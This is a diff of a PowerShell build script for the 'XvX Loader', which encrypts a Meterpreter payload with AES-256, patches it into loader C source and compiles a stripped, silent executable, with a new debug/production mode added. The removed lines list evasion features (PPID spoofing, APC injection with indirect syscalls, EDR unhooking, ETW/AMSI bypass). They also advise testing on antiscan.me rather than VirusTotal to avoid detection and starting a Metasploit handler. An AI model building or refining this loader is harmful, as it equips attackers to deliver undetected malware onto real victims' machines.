@@ -18,15 +18,25 @@
 
 param(
     [string]$PayloadFile = "payload\meterpreter.bin",
-    [string]$OutputName = "Loader.exe"
+    [string]$OutputName = "",
+    [ValidateSet("prod","debug")]
+    [string]$Mode = "prod"
 )
 
 $ErrorActionPreference = "Stop"
 
+$IsDebug = ($Mode -eq "debug")
+
+if ($OutputName -eq "") {
+    $OutputName = if ($IsDebug) { "Loader_debug.exe" } else { "Loader.exe" }
+}
+
 Write-Host ""
-Write-Host "╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
-Write-Host "║     XvX LOADER - PRODUCTION BUILD SYSTEM                 ║" -ForegroundColor Cyan
-Write-Host "╚═══════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
+if ($IsDebug) {
+    Write-Host "[*] XvX Loader - DEBUG BUILD" -ForegroundColor Yellow
+} else {
+    Write-Host "[*] XvX Loader - PRODUCTION BUILD" -ForegroundColor Cyan
+}
 Write-Host ""
 
 # Step 1: Check payload exists
@@ -83,9 +93,9 @@ if ($shellcodeContent -match 'BYTE encryptedShellcode\[\] = \{([^}]+)\};') {
     }
     
     # Replace in loader_v3.c (between line markers)
-    $loaderSource = $loaderSource -replace '(?s)(// AES-256-CBC encrypted shellcode.*?BYTE encryptedShellcode\[)\d+(\] = \{).*?(\};)', "`$1$arraySize`$2`n    $shellcodeArray`n`$3"
-    $loaderSource = $loaderSource -replace '(?s)(BYTE aesKey\[32\] = \{)[^}]+(};)', "`$1$keyArray`$2"
-    $loaderSource = $loaderSource -replace '(?s)(BYTE aesIV\[16\] = \{)[^}]+(};)', "`$1$ivArray`$2"
+    $loaderSource = $loaderSource -replace '(?s)(// AES-256-CBC encrypted shellcode.*?BYTE encryptedShellcode\[)\d+(\] = \{).*?(\};)', "`${1}$arraySize`${2}`n    $shellcodeArray`n`${3}"
+    $loaderSource = $loaderSource -replace '(?s)(BYTE aesKey\[32\] = \{)[^}]+(};)', "`${1}$keyArray`${2}"
+    $loaderSource = $loaderSource -replace '(?s)(BYTE aesIV\[16\] = \{)[^}]+(};)', "`${1}$ivArray`${2}"
     
     Set-Content "loader_v3.c" -Value $loaderSource -NoNewline
     Write-Host "[+] Loader updated with encrypted payload ($arraySize bytes)" -ForegroundColor Green
@@ -94,17 +104,16 @@ if ($shellcodeContent -match 'BYTE encryptedShellcode\[\] = \{([^}]+)\};') {
     exit 1
 }
 
-# Step 5: Compile in PRODUCTION mode
-Write-Host ""
-Write-Host "[*] Compiling loader (PRODUCTION MODE)..." -ForegroundColor White
-Write-Host "    - Target: rundll32.exe (stable process)" -ForegroundColor DarkGray
-Write-Host "    - Parent: explorer.exe (PPID spoofing)" -ForegroundColor DarkGray
-Write-Host "    - Crypto: AES-256-CBC" -ForegroundColor DarkGray
-Write-Host "    - Evasion: Sandbox checks + EDR unhooking + ETW/AMSI bypass" -ForegroundColor DarkGray
-Write-Host "    - Injection: APC with indirect syscalls" -ForegroundColor DarkGray
+# Step 5: Compile
+if ($IsDebug) {
+    Write-Host "[*] Compiling loader (DEBUG MODE)..." -ForegroundColor Yellow
+    $compileCmd = "gcc -O0 -g -DDEBUG loader_v3.c modules\*.c modules\dosyscall.o -o output\$OutputName -ladvapi32 -lntdll -luser32"
+} else {
+    Write-Host "[*] Compiling loader (PRODUCTION MODE)..." -ForegroundColor White
+    $compileCmd = "gcc -O2 -DPRODUCTION loader_v3.c modules\*.c modules\dosyscall.o -o output\$OutputName -ladvapi32 -lntdll -luser32 -mwindows -s"
+}
 Write-Host ""
 
-$compileCmd = "gcc -O2 -DPRODUCTION loader_v3.c modules\*.c modules\dosyscall.o -o output\$OutputName -ladvapi32 -lntdll -luser32 -mwindows -s"
 $compileResult = Invoke-Expression $compileCmd 2>&1
 
 if ($LASTEXITCODE -ne 0) {
@@ -118,23 +127,12 @@ $finalBinary = Get-Item "output\$OutputName"
 $sizeKB = [math]::Round($finalBinary.Length / 1KB, 2)
 
 Write-Host ""
-Write-Host "╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Green
-Write-Host "║                  BUILD SUCCESSFUL                        ║" -ForegroundColor Green
-Write-Host "╚═══════════════════════════════════════════════════════════╝" -ForegroundColor Green
-Write-Host ""
-Write-Host "Output:       output\$OutputName" -ForegroundColor White
-Write-Host "Size:         $sizeKB KB" -ForegroundColor White
-Write-Host "Payload:      $payloadSize bytes (encrypted to $arraySize bytes)" -ForegroundColor White
-Write-Host "Optimized:    Yes (-O2)" -ForegroundColor Green
-Write-Host "Stripped:     Yes (no debug symbols)" -ForegroundColor Green
-Write-Host "Silent:       Yes (no console)" -ForegroundColor Green
-Write-Host "Obfuscated:   Yes (syscall names hidden)" -ForegroundColor Green
-Write-Host ""
-Write-Host "[+] Loader ready for red team operations!" -ForegroundColor Green
-Write-Host ""
-Write-Host "Deployment tips:" -ForegroundColor Yellow
-Write-Host "  • Test on filescan.io or antiscan.me (NEVER VirusTotal)" -ForegroundColor White
-Write-Host "  • Execute from writable directory (not C:\Windows)" -ForegroundColor White
-Write-Host "  • Ensure listener running: msfconsole -q -x 'use exploit/multi/handler; ...'" -ForegroundColor White
-Write-Host "  • Follow me on github" -ForegroundColor White
+Write-Host "[+] Build OK" -ForegroundColor Green
+Write-Host "Output:  output\$OutputName ($sizeKB KB)" -ForegroundColor White
+Write-Host "Payload: $payloadSize bytes (encrypted: $arraySize bytes)" -ForegroundColor White
+if ($IsDebug) {
+    Write-Host "Mode:    DEBUG (symbols, verbose, no sandbox delay)" -ForegroundColor Yellow
+} else {
+    Write-Host "Mode:    PRODUCTION (stripped, silent, -O2)" -ForegroundColor Cyan
+}
 Write-Host ""
